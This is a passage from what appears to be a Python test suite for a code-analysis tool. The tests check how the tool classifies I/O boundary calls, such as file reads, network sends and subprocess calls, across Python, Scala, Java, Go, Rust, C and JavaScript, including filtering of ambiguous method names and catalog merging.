            src="python:/app/embed.py:5-10:embed:function",
            dst=dst,
        )
        nodes_by_id = {
            dst: self._boundary_node(
                dst, "SentenceTransformer", tier=3,
                tier_name="external_dep",
            ),
        }
        bmap = compute_boundary_map(
            [edge],
            {"python": load_catalog("python")},
            nodes_by_id=nodes_by_id,
        )
        chain = bmap.entries["external_potential"].chains[0]
        assert chain.dst_tier == 3
        assert chain.dst_tier_name == "external_dep"
        assert chain.dst_external_boundary is True
        # Primitive carries module + name so the user can identify the
        # specific wrapper, not just "something external".
        assert "sentence_transformers" in chain.primitive
        assert "SentenceTransformer" in chain.primitive

    def test_external_potential_skips_when_nodes_by_id_missing(self) -> None:
        from hypergumbo_core.io_boundary import compute_boundary_map

        # Without nodes_by_id the boundary-node check can't run; we
        # cannot tell external_boundary from first-party. Defensive: no
        # external_potential bucket at all.
        edge = self._mock_edge(
            src="python:/app/x.py:5-10:f:function",
            dst="python:something:0-0:Random:unresolved",
        )
        bmap = compute_boundary_map(
            [edge], {"python": load_catalog("python")},
        )
        assert "external_potential" not in bmap.entries

    def test_external_potential_skips_when_dst_not_external_boundary(
        self,
    ) -> None:
        from hypergumbo_core.io_boundary import compute_boundary_map

        # First-party dst (no external_boundary flag) — even if its tier
        # were exotic, it's our own code; don't synthesize a chain.
        dst = "python:/app/util.py:5-10:helper:function"
        edge = self._mock_edge(
            src="python:/app/main.py:5-10:main:function",
            dst=dst,
        )
        nodes_by_id = {
            dst: {
                "id": dst,
                "name": "helper",
                "kind": "function",
                "language": "python",
                "path": "/app/util.py",
                "meta": {},  # no external_boundary
                "supply_chain": {"tier": 1, "tier_name": "first_party"},
            },
        }
        bmap = compute_boundary_map(
            [edge],
            {"python": load_catalog("python")},
            nodes_by_id=nodes_by_id,
        )
        assert "external_potential" not in bmap.entries

    def test_external_potential_skips_stdlib_other_symbols(
        self, tmp_path: Path,
    ) -> None:
        from hypergumbo_core.io_boundary import (
            IoBoundaryCatalog,
            compute_boundary_map,
        )

        # Build a fake-language catalog declaring math.sqrt as stdlib_other,
        # then verify a call to math.sqrt does NOT appear in
        # external_potential — it's stdlib non-IO, not a catalog gap.
        catalog = IoBoundaryCatalog._from_dict({
            "language": "python",
            "status": "complete",
            "stdlib_provenance": {
                "source_url": "https://docs.python.org/3.13/library/index.html",
                "version": "3.13",
                "retrieved": "2026-04-23",
            },
            "stdlib_other": [{"module": "math", "functions": ["sqrt"]}],
        })
        dst = "python:math:0-0:sqrt:unresolved"
        edge = self._mock_edge(
            src="python:/app/calc.py:5-10:run:function", dst=dst,
        )
        nodes_by_id = {dst: self._boundary_node(dst, "sqrt")}
        bmap = compute_boundary_map(
            [edge], {"python": catalog}, nodes_by_id=nodes_by_id,
        )
        assert "external_potential" not in bmap.entries

    def test_external_potential_skips_when_language_unsupported(self) -> None:
        from hypergumbo_core.io_boundary import compute_boundary_map

        # No catalog for "fortran"; we don't know its stdlib at all so
        # we can't make completeness claims either way. Defensive skip.
        dst = "fortran:weird:0-0:doSomething:unresolved"
        edge = self._mock_edge(
            src="fortran:/app/main.f90:5-10:main:function",
            dst=dst,
        )
        nodes_by_id = {
            dst: self._boundary_node(dst, "doSomething", lang="fortran"),
        }
        bmap = compute_boundary_map(
            [edge], {}, nodes_by_id=nodes_by_id,
        )
        assert "external_potential" not in bmap.entries

    def test_external_potential_chain_to_dict_includes_unreliable_flag(
        self,
    ) -> None:
        chain = IoChain(
            boundary="external_potential",
            primitive="huggingface_hub.snapshot_download",
            io_edge_src="s1",
            io_edge_dst="d1",
            dst_tier=3,
            dst_tier_name="external_dep",
            dst_external_boundary=True,
            dst_classification_unreliable=True,
        )
        d = chain.to_dict()
        assert d["dst_classification_unreliable"] is True
        # Defaults to False when not set.
        chain2 = IoChain(
            boundary="external_potential", primitive="x",
            io_edge_src="s", io_edge_dst="d",
        )
        assert chain2.to_dict()["dst_classification_unreliable"] is False

    def test_external_potential_skips_non_traceable_edge_types(self) -> None:
        from hypergumbo_core.io_boundary import compute_boundary_map

        # contains/inherits/etc. are not in _TRACEABLE_EDGE_TYPES — even
        # if the dst is an external boundary, those don't represent
        # call/data-flow reach so they shouldn't synthesize chains.
        dst = "python:huggingface_hub:0-0:snapshot_download:unresolved"
        edge = self._mock_edge(
            src="python:/app/load.py:5-10:Holder:class",
            dst=dst,
            edge_type="contains",
        )
        nodes_by_id = {dst: self._boundary_node(dst, "snapshot_download")}
        bmap = compute_boundary_map(
            [edge],
            {"python": load_catalog("python")},
            nodes_by_id=nodes_by_id,
        )
        assert "external_potential" not in bmap.entries

    def test_external_potential_falls_back_to_bare_name_when_no_module_hint(
        self,
    ) -> None:
        from hypergumbo_core.io_boundary import compute_boundary_map

        # When _extract_module_hint returns "external" (or the hint is
        # missing), the composed primitive is just the dst name. The
        # chain is still emitted; the user gets less context but the
        # signal isn't lost.
        dst = "python:external:0-0:MysteryThing:unresolved"
        edge = self._mock_edge(
            src="python:/app/x.py:5-10:f:function",
            dst=dst,
        )
        nodes_by_id = {dst: self._boundary_node(dst, "MysteryThing")}
        bmap = compute_boundary_map(
            [edge],
            {"python": load_catalog("python")},
            nodes_by_id=nodes_by_id,
        )
        ext = bmap.entries.get("external_potential")
        assert ext is not None and len(ext.chains) == 1
        # No module prefix — bare dst name.
        assert ext.chains[0].primitive == "MysteryThing"

    def test_external_potential_aggregates_multiple_chains_per_primitive(
        self,
    ) -> None:
        from hypergumbo_core.io_boundary import compute_boundary_map

        dst = "python:huggingface_hub:0-0:snapshot_download:unresolved"
        edges = [
            self._mock_edge(
                src=f"python:/app/load{i}.py:5-10:load:function", dst=dst,
            )
            for i in range(3)
        ]
        nodes_by_id = {dst: self._boundary_node(dst, "snapshot_download")}
        bmap = compute_boundary_map(
            edges,
            {"python": load_catalog("python")},
            nodes_by_id=nodes_by_id,
        )
        ext = bmap.entries["external_potential"]
        assert len(ext.chains) == 3
        # Aggregation: primitives_used dedupes
        assert ext.primitives_used == ["huggingface_hub.snapshot_download"]
        # Per-primitive count surfaces in to_dict
        d = ext.to_dict()
        assert d["primitive_counts"] == {
            "huggingface_hub.snapshot_download": 3,
        }

    def test_external_potential_skips_unresolved_edge(self) -> None:
        """F3 Filter 1: edges with is_resolved=False skip external_potential.

        Per ADR-0028, ``Edge.is_resolved`` is False when the dst symbol
        was not resolved at analysis time — these edges point at a
        speculative external target and contribute heavily to
        external_potential noise on self-analysis. Filter 1 skips them.
        """
        from hypergumbo_core.io_boundary import compute_boundary_map

        dst = "python:huggingface_hub:0-0:snapshot_download:unresolved"
        edge = self._mock_edge(
            src="python:/app/load.py:5-10:load_model:function",
            dst=dst,
            is_resolved=False,
        )
        nodes_by_id = {dst: self._boundary_node(dst, "snapshot_download")}
        bmap = compute_boundary_map(
            [edge],
            {"python": load_catalog("python")},
            nodes_by_id=nodes_by_id,
        )
        # Filter 1 short-circuits before chain emission.
        assert "external_potential" not in bmap.entries

    def test_external_potential_resolved_edge_still_emits_chain(self) -> None:
        """F3 Filter 1 sanity: is_resolved=True (default) still emits."""
        from hypergumbo_core.io_boundary import compute_boundary_map

        dst = "python:huggingface_hub:0-0:snapshot_download:unresolved"
        edge = self._mock_edge(
            src="python:/app/load.py:5-10:load_model:function",
            dst=dst,
            is_resolved=True,
        )
        nodes_by_id = {dst: self._boundary_node(dst, "snapshot_download")}
        bmap = compute_boundary_map(
            [edge],
            {"python": load_catalog("python")},
            nodes_by_id=nodes_by_id,
        )
        ext = bmap.entries.get("external_potential")
        assert ext is not None and len(ext.chains) == 1

    def test_external_potential_does_not_double_prepend_module_in_dst_name(
        self,
    ) -> None:
        """F3 Filter 3: composition does not produce ``re.re.MULTILINE``.

        When the dst node's ``name`` field already carries the qualified
        form (``re.MULTILINE``) and the module_hint is ``re``, the prior
        composition produced ``re.re.MULTILINE``. Filter 3 detects that
        ``dst_name`` already starts with ``module_hint + "."`` and skips
        the prepend.
        """
        from hypergumbo_core.io_boundary import compute_boundary_map

        # dst node's name is the qualified form `re.MULTILINE`; module hint
        # is `re` (extracted from the 2nd colon-separated field).
        dst = "python:re:0-0:re.MULTILINE:unresolved"
        edge = self._mock_edge(
            src="python:/app/main.py:5-10:f:function",
            dst=dst,
        )
        nodes_by_id = {dst: self._boundary_node(dst, "re.MULTILINE")}
        bmap = compute_boundary_map(
            [edge],
            {"python": load_catalog("python")},
            nodes_by_id=nodes_by_id,
        )
        ext = bmap.entries.get("external_potential")
        assert ext is not None and len(ext.chains) == 1
        assert ext.chains[0].primitive == "re.MULTILINE", (
            f"Expected 're.MULTILINE', got {ext.chains[0].primitive!r}"
        )


class TestScalaCatalog:
    """Tests for the standalone Scala I/O catalog with Java parent merging."""

    def test_scala_loads_own_catalog(self) -> None:
        """Scala has its own catalog (not just an alias to Java)."""
        catalog = load_catalog("scala")
        assert catalog.language == "scala"
        # Scala-specific entries should exist
        scala_modules = {p.module for p in catalog.primitives}
        assert any("scala.io" in m for m in scala_modules), (
            "Scala catalog should include scala.io entries"
        )

    def test_scala_inherits_java_entries(self) -> None:
        """Scala catalog merges Java entries via parent inheritance."""
        catalog = load_catalog("scala")
        # Java stdlib entries should be available through inheritance
        assert catalog.lookup("java.io.FileInputStream.read") is not None

    # Plan C, PR A: presence tests for cats-effect / ZIO / sttp / http4s
    # / akka-http / pekko-http / fs2 / Slick / Doobie / Quill /
    # ScalikeJDBC / Anorm / ReactiveMongo removed — those are no longer
    # in the catalog. Inverse coverage: test_scala_catalog_excludes_third_party_wrappers
    # is structural (asserts every module starts with scala.* / java.* /
    # javax.* / jakarta.*).

    def test_scala_catalog_all_boundary_types(self) -> None:
        """Scala catalog covers all major boundary types via its own
        entries plus the Java parent merge."""
        catalog = load_catalog("scala")
        boundaries = {p.boundary for p in catalog.primitives}
        # Scala should have at least these from its own + Java parent
        expected = {"fs_read", "fs_write", "net_send", "net_recv", "subprocess", "env_read"}
        assert expected.issubset(boundaries), (
            f"Missing boundaries: {expected - boundaries}"
        )

    def test_scala_own_entries_override_java(self) -> None:
        """When Scala has the same qualified name as Java, Scala's entry wins."""
        catalog = load_catalog("scala")
        # Scala.io.Source.fromFile should come from scala.yaml, not java.yaml
        hit = catalog.lookup("scala.io.Source.fromFile")
        assert hit is not None
        assert hit.boundary == "fs_read"


class TestAmbiguousNameFiltering:
    """Tests for ambiguous short-name filtering on unresolved externals.

    Generic method names like 'bind', 'start', 'exec' produce false positives
    when matched against unresolved external calls (module_hint='external').
    Catalogs with an ambiguous_names list should reject these matches.
    """

    def _make_edge(self, src: str, dst: str, edge_type: str = "calls"):
        from dataclasses import dataclass
        from typing import Optional, Dict, Any

        @dataclass
        class MockEdge:
            src: str
            dst: str
            edge_type: str
            meta: Optional[Dict[str, Any]] = None

        return MockEdge(src=src, dst=dst, edge_type=edge_type, meta=None)

    def test_scala_bind_not_matched_as_socket(self) -> None:
        """Scala's monadic 'bind' should NOT match java.net.ServerSocket.bind."""
        catalog = load_catalog("scala")
        edge = self._make_edge(
            src="scala:core/src/main/scala/cats/Monad.scala:10:flatMap:method",
            dst="scala:external:0-0:bind:unresolved",
        )
        count = tag_io_boundaries([edge], {"scala": catalog})
        assert count == 0, "Generic 'bind' should not match ServerSocket.bind for unresolved externals"

    def test_scala_start_not_matched_as_process(self) -> None:
        """Scala's 'start' should NOT match java.lang.ProcessBuilder.start."""
        catalog = load_catalog("scala")
        edge = self._make_edge(
            src="scala:core/src/main/scala/cats/Eval.scala:10:loop:method",
            dst="scala:external:0-0:start:unresolved",
        )
        count = tag_io_boundaries([edge], {"scala": catalog})
        assert count == 0, "Generic 'start' should not match ProcessBuilder.start for unresolved externals"

    def test_scala_exec_not_matched_as_runtime(self) -> None:
        """Scala's 'exec' (e.g., ExecutionContext.exec) should NOT match Runtime.exec."""
        catalog = load_catalog("scala")
        edge = self._make_edge(
            src="scala:core/src/main/scala/Effect.scala:10:run:method",
            dst="scala:external:0-0:exec:unresolved",
        )
        count = tag_io_boundaries([edge], {"scala": catalog})
        assert count == 0, "Generic 'exec' should not match Runtime.exec for unresolved externals"

    def test_scala_specific_names_still_match(self) -> None:
        """io-boundary:F3 — ``readAllBytes`` is ``java.nio.file.Files``'s
        method-kind static method (inherited via the java parent catalog). A
        BARE unresolved call with no module context is now suppressed
        (INV-tapat: no receiver verification); in a real repo the java analyzer
        emits ``Files.readAllBytes`` with the ``java.nio.file.Files`` module
        hint (receiver in imports), so the WITH-module form still matches."""
        catalog = load_catalog("scala")
        bare = self._make_edge(
            src="scala:IO.scala:10:readFile:method",
            dst="scala:external:0-0:readAllBytes:unresolved",
        )
        assert tag_io_boundaries([bare], {"scala": catalog}) == 0
        assert bare.meta is None
        # With the receiver module the method-kind primitive still matches.
        hinted = self._make_edge(
            src="scala:IO.scala:10:readFile:method",
            dst="scala:java.nio.file.Files:0-0:readAllBytes:unresolved",
        )
        assert tag_io_boundaries([hinted], {"scala": catalog}) == 1, (
            "module-hinted Files.readAllBytes must still match under F3")

    def test_scala_resolved_call_with_module_still_matches(self) -> None:
        """Resolved calls with proper module context should still match even for ambiguous names."""
        catalog = load_catalog("scala")
        edge = self._make_edge(
            src="scala:Main.scala:10:main:method",
            dst="scala:java.net.ServerSocket:0-0:bind:unresolved",
        )
        count = tag_io_boundaries([edge], {"scala": catalog})
        assert count == 1, "Ambiguous name 'bind' should match when module context confirms ServerSocket"

    def test_scala_mkstring_not_matched_as_source(self) -> None:
        """Scala's collection mkString should NOT match scala.io.Source.mkString."""
        catalog = load_catalog("scala")
        edge = self._make_edge(
            src="scala:Main.scala:10:show:method",
            dst="scala:external:0-0:mkString:unresolved",
        )
        count = tag_io_boundaries([edge], {"scala": catalog})
        assert count == 0, "Generic 'mkString' should not match Source.mkString for unresolved externals"

    def test_scala_getOrElse_not_matched_as_sysprops(self) -> None:
        """Scala's Option.getOrElse should NOT match SystemProperties.getOrElse."""
        catalog = load_catalog("scala")
        edge = self._make_edge(
            src="scala:Config.scala:10:get:method",
            dst="scala:external:0-0:getOrElse:unresolved",
        )
        count = tag_io_boundaries([edge], {"scala": catalog})
        assert count == 0, "Generic 'getOrElse' should not match SystemProperties for unresolved externals"

    def test_scala_foreach_not_matched_as_sql(self) -> None:
        """Scala's collection foreach should NOT match scalikejdbc.SQL.foreach."""
        catalog = load_catalog("scala")
        edge = self._make_edge(
            src="scala:Handler.scala:10:process:method",
            dst="scala:external:0-0:foreach:unresolved",
        )
        count = tag_io_boundaries([edge], {"scala": catalog})
        assert count == 0, "Generic 'foreach' should not match SQL.foreach for unresolved externals"

    def test_go_external_still_works(self) -> None:
        """Go catalog: distinctive names like 'Open' still match without module context."""
        catalog = load_catalog("go")
        edge = self._make_edge(
            src="go:/a.go:1:main:function",
            dst="go:external:0-0:Open:unresolved",
        )
        count = tag_io_boundaries([edge], {"go": catalog})
        assert count == 1, "Go external matching should still work for distinctive names"

    # --- Java ambiguous names (WI-gonav) ---

    def test_java_size_not_matched_as_files_size(self) -> None:
        """Java's ``List.size()`` / ``Map.size()`` / ``Collection.size()`` must
        NOT be classified as ``java.nio.file.Files.size`` (fs_read) just
        because the bare method name happens to collide.

        UAT 2026-04-13 BUG-10: at Vet.java:66,
        ``getSpecialtiesInternal().size()`` was reported as ``Files.size``.
        """
        catalog = load_catalog("java")
        edge = self._make_edge(
            src="java:Vet.java:66:getSpecialtiesInternal:method",
            dst="java:external:0-0:size:unresolved",
        )
        count = tag_io_boundaries([edge], {"java": catalog})
        assert count == 0, (
            "Generic 'size' should not match Files.size without module context"
        )

    def test_java_length_not_matched_without_module(self) -> None:
        """Java's ``String.length()`` / ``array.length`` must NOT match
        ``java.io.File.length`` (fs_read) on short-name alone."""
        catalog = load_catalog("java")
        edge = self._make_edge(
            src="java:User.java:42:getName:method",
            dst="java:external:0-0:length:unresolved",
        )
        count = tag_io_boundaries([edge], {"java": catalog})
        assert count == 0, (
            "Generic 'length' should not match File.length without module context"
        )

    def test_java_resolved_files_size_still_matches(self) -> None:
        """When module context confirms ``java.nio.file.Files``, a resolved
        ``size`` call STILL matches as fs_read (the ambiguous filter only
        rejects unresolved-external short-name matches)."""
        catalog = load_catalog("java")
        edge = self._make_edge(
            src="java:FileUtil.java:10:fileSize:method",
            dst="java:java.nio.file.Files:0-0:size:unresolved",
        )
        count = tag_io_boundaries([edge], {"java": catalog})
        assert count == 1, (
            "Resolved Files.size should still match as fs_read"
        )

    # --- Go ambiguous names ---

    def test_go_bare_run_not_matched(self) -> None:
        """Go: bare 'Run' must not match any Run row without module context."""
        catalog = load_catalog("go")
        edge = self._make_edge(
            src="go:/main.go:10:TestFoo:function",
            dst="go:external:0-0:Run:unresolved",
        )
        count = tag_io_boundaries([edge], {"go": catalog})
        assert count == 0, "Bare 'Run' is ambiguous (testing.T.Run, cobra.Command.Run)"

    def test_go_bare_string_not_matched(self) -> None:
        """Go: bare 'String' must not match without module context."""
        catalog = load_catalog("go")
        edge = self._make_edge(
            src="go:/main.go:10:handler:function",
            dst="go:external:0-0:String:unresolved",
        )
        count = tag_io_boundaries([edge], {"go": catalog})
        assert count == 0, "Bare 'String' is ambiguous (fmt.Stringer.String)"

    def test_go_bare_read_not_matched(self) -> None:
        """Go: bare 'Read' should NOT match net.Conn.Read without module context."""
        catalog = load_catalog("go")
        edge = self._make_edge(
            src="go:/main.go:10:process:function",
            dst="go:external:0-0:Read:unresolved",
        )
        count = tag_io_boundaries([edge], {"go": catalog})
        assert count == 0, "Bare 'Read' is ambiguous (io.Reader.Read on many types)"

    def test_go_bare_write_not_matched(self) -> None:
        """Go: bare 'Write' should NOT match net.Conn.Write without module context."""
        catalog = load_catalog("go")
        edge = self._make_edge(
            src="go:/main.go:10:process:function",
            dst="go:external:0-0:Write:unresolved",
        )
        count = tag_io_boundaries([edge], {"go": catalog})
        assert count == 0, "Bare 'Write' is ambiguous (io.Writer.Write on many types)"

    def test_go_qualified_run_still_matches(self) -> None:
        """Go: 'Run' with an os/exec module context should still match.

        The point of this test is that a module hint RESCUES an ambiguous short
        name that ``test_go_bare_run_not_matched`` shows is refused bare — and
        that point is unchanged. Only the example row moved: it used to use
        ``go:gin.Engine:...`` , which was unreachable in production because the
        catalogue spelled the module as a package identifier while the analyzer
        emits the import path (INV-safig). Asserting against a row that could
        never fire made this a test of the fixture rather than of the gate, so
        it now uses a stdlib row the analyzer really does emit.
        """
        catalog = load_catalog("go")
        edge = self._make_edge(
            src="go:/main.go:10:main:function",
            dst="go:os/exec:0-0:Run:unresolved",
        )
        count = tag_io_boundaries([edge], {"go": catalog})
        assert count == 1, "Qualified 'Run' on os/exec should match"

    # --- Rust ambiguous names ---

    def test_rust_bare_put_not_matched(self) -> None:
        """Rust: bare 'put' should NOT match reqwest::Client.put without module context."""
        catalog = load_catalog("rust")
        edge = self._make_edge(
            src="rust:src/main.rs:10:process:function",
            dst="rust:external:0-0:put:unresolved",
        )
        count = tag_io_boundaries([edge], {"rust": catalog})
        assert count == 0, "Bare 'put' is ambiguous (HashMap.insert pattern)"

    def test_rust_bare_read_to_end_not_matched(self) -> None:
        """Rust: bare 'read_to_end' should NOT match TcpStream without module context."""
        catalog = load_catalog("rust")
        edge = self._make_edge(
            src="rust:src/main.rs:10:load:function",
            dst="rust:external:0-0:read_to_end:unresolved",
        )
        count = tag_io_boundaries([edge], {"rust": catalog})
        assert count == 0, "Bare 'read_to_end' is ambiguous (Read trait on Vec, Cursor, etc.)"

    def test_rust_distinctive_read_dir_still_matches(self) -> None:
        """Rust: distinctive 'read_dir' should still match without module context."""
        catalog = load_catalog("rust")
        edge = self._make_edge(
            src="rust:src/main.rs:10:load:function",
            dst="rust:external:0-0:read_dir:unresolved",
        )
        count = tag_io_boundaries([edge], {"rust": catalog})
        assert count == 1, "Distinctive 'read_dir' should match even without module context"

    # --- Python ambiguous names ---

    def test_python_bare_write_not_matched(self) -> None:
        """Python: bare 'write' should NOT match asyncio.StreamWriter without module context."""
        catalog = load_catalog("python")
        edge = self._make_edge(
            src="python:src/app.py:10:process:function",
            dst="python:external:0-0:write:unresolved",
        )
        count = tag_io_boundaries([edge], {"python": catalog})
        assert count == 0, "Bare 'write' is ambiguous (io.StringIO.write, any .write())"

    def test_python_bare_read_not_matched(self) -> None:
        """Python: bare 'read' should NOT match asyncio.StreamReader without module context."""
        catalog = load_catalog("python")
        edge = self._make_edge(
            src="python:src/app.py:10:process:function",
            dst="python:external:0-0:read:unresolved",
        )
        count = tag_io_boundaries([edge], {"python": catalog})
        assert count == 0, "Bare 'read' is ambiguous (io.BytesIO.read, any .read())"

    def test_python_bare_run_not_matched(self) -> None:
        """Python: bare 'run' should NOT match subprocess.run without module context."""
        catalog = load_catalog("python")
        edge = self._make_edge(
            src="python:src/app.py:10:main:function",
            dst="python:external:0-0:run:unresolved",
        )
        count = tag_io_boundaries([edge], {"python": catalog})
        assert count == 0, "Bare 'run' is ambiguous (asyncio.run, flask.Flask.run, etc.)"

    def test_python_qualified_run_still_matches(self) -> None:
        """Python: 'run' with subprocess module context should still match."""
        catalog = load_catalog("python")
        edge = self._make_edge(
            src="python:src/app.py:10:main:function",
            dst="python:subprocess:0-0:run:unresolved",
        )
        count = tag_io_boundaries([edge], {"python": catalog})
        assert count == 1, "Qualified 'run' on subprocess should match"

    # --- Java ambiguous names ---

    def test_java_bare_put_not_matched(self) -> None:
        """Java: bare 'put' should NOT match RestTemplate.put without module context."""
        catalog = load_catalog("java")
        edge = self._make_edge(
            src="java:src/Main.java:10:process:method",
            dst="java:external:0-0:put:unresolved",
        )
        count = tag_io_boundaries([edge], {"java": catalog})
        assert count == 0, "Bare 'put' is ambiguous (Map.put, ByteBuffer.put)"

    def test_java_bare_read_not_matched(self) -> None:
        """Java: bare 'read' should NOT match FileInputStream.read without module context."""
        catalog = load_catalog("java")
        edge = self._make_edge(
            src="java:src/Main.java:10:process:method",
            dst="java:external:0-0:read:unresolved",
        )
        count = tag_io_boundaries([edge], {"java": catalog})
        assert count == 0, "Bare 'read' is ambiguous (ByteBuffer.read, any .read())"

    def test_java_qualified_read_still_matches(self) -> None:
        """Java: 'read' with FileInputStream module context should still match."""
        catalog = load_catalog("java")
        edge = self._make_edge(
            src="java:src/Main.java:10:load:method",
            dst="java:java.io.FileInputStream:0-0:read:unresolved",
        )
        count = tag_io_boundaries([edge], {"java": catalog})
        assert count == 1, "Qualified 'read' on FileInputStream should match"

    # --- C ambiguous names ---

    def test_c_bare_read_not_matched(self) -> None:
        """C: bare 'read' should NOT match unistd read without module context."""
        catalog = load_catalog("c")
        edge = self._make_edge(
            src="c:src/main.c:10:process:function",
            dst="c:external:0-0:read:unresolved",
        )
        count = tag_io_boundaries([edge], {"c": catalog})
        assert count == 0, "Bare 'read' is ambiguous in C (project-local read() functions)"

    def test_c_bare_write_not_matched(self) -> None:
        """C: bare 'write' should NOT match unistd write without module context."""
        catalog = load_catalog("c")
        edge = self._make_edge(
            src="c:src/main.c:10:process:function",
            dst="c:external:0-0:write:unresolved",
        )
        count = tag_io_boundaries([edge], {"c": catalog})
        assert count == 0, "Bare 'write' is ambiguous in C (project-local write() functions)"

    # --- JavaScript ambiguous names ---

    def test_js_bare_send_not_matched(self) -> None:
        """JS: bare 'send' should NOT match socket.send without module context."""
        catalog = load_catalog("javascript")
        edge = self._make_edge(
            src="javascript:src/app.js:10:handler:function",
            dst="javascript:external:0-0:send:unresolved",
        )
        count = tag_io_boundaries([edge], {"javascript": catalog})
        assert count == 0, "Bare 'send' is ambiguous (express.Response.send, EventEmitter)"

    def test_js_bare_listen_not_matched(self) -> None:
        """JS: bare 'listen' should NOT match net.Server.listen without module context."""
        catalog = load_catalog("javascript")
        edge = self._make_edge(
            src="javascript:src/app.js:10:main:function",
            dst="javascript:external:0-0:listen:unresolved",
        )
        count = tag_io_boundaries([edge], {"javascript": catalog})
        assert count == 0, "Bare 'listen' is ambiguous (EventEmitter.on pattern)"

    def test_js_distinctive_readFile_still_matches(self) -> None:
        """JS: distinctive name 'readFile' should still match without module context."""
        catalog = load_catalog("javascript")
        edge = self._make_edge(
            src="javascript:src/app.js:10:load:function",
            dst="javascript:external:0-0:readFile:unresolved",
        )
        count = tag_io_boundaries([edge], {"javascript": catalog})
        assert count == 1, "Distinctive 'readFile' should match even without module context"

    def test_js_bare_remove_not_matched(self) -> None:
        """JS: bare 'remove' should NOT match Deno.remove without module context.

        react-hook-form's useFieldArray().remove() and Array operations use
        'remove' extensively.  Without module context, this must not be tagged
        as Deno fs_write.
        """
        catalog = load_catalog("javascript")
        edge = self._make_edge(
            src="javascript:src/components/Form.tsx:42:FormComponent:function",
            dst="javascript:external:0-0:remove:unresolved",
        )
        count = tag_io_boundaries([edge], {"javascript": catalog})
        assert count == 0, "Bare 'remove' is ambiguous (Array.remove, react-hook-form, etc.)"


class TestCatalogMerge:
    """Tests for catalog parent merging."""

    def test_merge_adds_parent_entries(self) -> None:
        """Merging a parent catalog adds its entries."""
        child = IoBoundaryCatalog(
            language="scala",
            primitives=[
                IoPrimitive("fs_read", "scala.io.Source", "fromFile", "method"),
            ],
        )
        parent = IoBoundaryCatalog(
            language="java",
            primitives=[
                IoPrimitive("fs_read", "java.io.File", "exists", "method"),
            ],
        )
        merged = child.merge(parent)
        assert merged.language == "scala"
        assert len(merged.primitives) == 2
        assert merged.lookup("scala.io.Source.fromFile") is not None
        assert merged.lookup("java.io.File.exists") is not None

    def test_merge_child_wins_on_conflict(self) -> None:
        """When both catalogs have the same qualified name, child's entry wins."""
        child = IoBoundaryCatalog(
            language="scala",
            primitives=[
                IoPrimitive("net_send", "some.module", "send", "method", "scala version"),
            ],
        )
        parent = IoBoundaryCatalog(
            language="java",
            primitives=[
                IoPrimitive("net_recv", "some.module", "send", "method", "java version"),
            ],
        )
        merged = child.merge(parent)
        hit = merged.lookup("some.module.send")
        assert hit is not None
        assert hit.boundary == "net_send"  # child's version
        assert hit.notes == "scala version"

    def test_merge_preserves_ambiguous_names(self) -> None:
        """Merging inherits ambiguous_names from both catalogs."""
        child = IoBoundaryCatalog(
            language="scala",
            primitives=[],
            ambiguous_names=frozenset({"bind"}),
        )
        parent = IoBoundaryCatalog(
            language="java",
            primitives=[],
            ambiguous_names=frozenset({"exec"}),
        )
        merged = child.merge(parent)
        assert "bind" in merged.ambiguous_names
        assert "exec" in merged.ambiguous_names


class TestStdlibModulesAndFilter2:
    """F3 PR-C: stdlib_modules / stdlib_prefixes / per-module completeness.

    These tests pin the behavior of:
    - :attr:`IoBoundaryCatalog.stdlib_modules` (frozenset)
    - :attr:`IoBoundaryCatalog.stdlib_prefixes` (tuple)
    - :attr:`IoBoundaryCatalog.stdlib_module_completeness` (dict)
    - :meth:`IoBoundaryCatalog.is_stdlib_module` (exact + prefix)
    - :meth:`IoBoundaryCatalog.module_io_is_enumerated` (the closed-world
      question, prefix-anchored; it replaced the exact-match
      ``is_stdlib_module_complete`` so the coverage gate and Filter 2 ask
      one predicate rather than two that can drift)
    - YAML parser for the new shapes (flat list AND list-of-dicts with
      ``completeness:``)
    - ``merge`` propagation for all three fields
    - Filter 2 in ``_compute_external_potential`` (module gating)
    """

    def test_is_stdlib_module_exact(self) -> None:
        cat = IoBoundaryCatalog(
            language="python",
            stdlib_modules=frozenset({"os", "sys", "re"}),
        )
        assert cat.is_stdlib_module("os")
        assert cat.is_stdlib_module("sys")
        assert not cat.is_stdlib_module("not_a_stdlib")

    def test_is_stdlib_module_empty_string_returns_false(self) -> None:
        cat = IoBoundaryCatalog(
            language="python",
            stdlib_modules=frozenset({"os"}),
        )
        assert cat.is_stdlib_module("") is False

    def test_is_stdlib_module_prefix_dot(self) -> None:
        cat = IoBoundaryCatalog(
            language="java",
            stdlib_prefixes=("java.util", "java.io"),
        )
        # Exact prefix match.
        assert cat.is_stdlib_module("java.util")
        # Sub-module under prefix.
        assert cat.is_stdlib_module("java.util.HashMap")
        assert cat.is_stdlib_module("java.io.File")
        # Lookalike that is NOT a sub-module — must NOT match the prefix.
        assert not cat.is_stdlib_module("java.utilities")

    def test_is_stdlib_module_prefix_slash(self) -> None:
        cat = IoBoundaryCatalog(
            language="go",
            stdlib_prefixes=("encoding",),
        )
        assert cat.is_stdlib_module("encoding")
        assert cat.is_stdlib_module("encoding/json")
        assert not cat.is_stdlib_module("encoder/foo")

    def test_is_stdlib_module_empty_catalog_returns_false(self) -> None:
        cat = IoBoundaryCatalog(language="python")
        assert not cat.is_stdlib_module("os")

    def test_is_stdlib_module_dotted_submodule_of_enumerated_package(self) -> None:
        # WI-bifih: python.yaml enumerates only TOP-LEVEL module names and
        # declares no ``stdlib_prefixes``, so a submodule import like
        # ``unittest.mock`` / ``os.path`` / ``urllib.request`` must still be
        # recognised as stdlib via its top-level package — otherwise its
        # ecosystem is mis-stamped ``third_party`` (355 such edges on the
        # self-corpus). A submodule of an enumerated stdlib package IS stdlib.
        cat = IoBoundaryCatalog(
            language="python",
            stdlib_modules=frozenset({"os", "unittest", "urllib", "importlib"}),
        )
        assert cat.is_stdlib_module("os.path")
        assert cat.is_stdlib_module("unittest.mock")
        assert cat.is_stdlib_module("urllib.request")
        assert cat.is_stdlib_module("importlib.metadata")
        # Head NOT enumerated -> stays non-stdlib (no false positives).
        assert not cat.is_stdlib_module("requests.sessions")
        # A bare non-stdlib name with no separator is unaffected.
        assert not cat.is_stdlib_module("requests")

    def test_is_stdlib_module_slash_submodule_of_enumerated_package(self) -> None:
        # The same fallback covers slash-namespaced languages when the
        # top-level package is enumerated in ``stdlib_modules`` (rather than
        # ``stdlib_prefixes``).
        cat = IoBoundaryCatalog(
            language="go", stdlib_modules=frozenset({"encoding"})
        )
        assert cat.is_stdlib_module("encoding/json")
        assert not cat.is_stdlib_module("github.com/x/y")

    def test_is_stdlib_module_dotted_submodule_against_shipped_python_yaml(
        self,
